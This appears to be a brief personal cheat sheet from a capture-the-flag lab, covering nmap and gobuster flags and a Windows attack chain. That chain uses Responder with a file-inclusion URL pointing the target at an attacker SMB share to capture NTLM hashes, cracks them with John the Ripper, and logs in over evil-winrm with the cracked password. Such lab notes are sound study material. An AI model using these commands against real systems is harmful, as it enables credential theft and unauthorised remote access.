#nmap

```shell
-sC: Performs a script scan using the default set of scripts. It is equivalent to --
script=default. Some of the scripts in this category are considered intrusive and
should not be run against a target network without permission.

-sV: Enables version detection, which will detect what versions are running on what
port.h

-p- : This flag scans for all TCP ports ranging from 0-65535

--min-rate : This is used to specify the minimum number of packets Nmap should send per
second; it speeds up the scan as the number goes higher
```

#gobuster

```shell
dir : Uses directory/file enumeration mode.
--url : The target URL.
--wordlist : Path to the wordlist.
-x : File extension(s) to search for. (php/html)
```

# Responder:
```shell
sudo responder -I {network_interface} 
http://unika.htb/?page=//10.10.14.25/somefile
```

# John the riper:
```shell
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

#evil-winrm
```shell
evil-winrm -i 10.129.136.91 -u administrator -p badminton
```

# Acronyms

WinRM, is a Windows-native built-in remote management protocol. port: 5985
NTLM: New Technology LAN Manager
LFI: Local File inclusion // File Inclusion Vulnerability // https://www.php.net/manual/en/function.include.php 
RFI: Remote File Inclusion // File Inclusion Vulnerability // https://www.php.net/manual/en/function.include.php
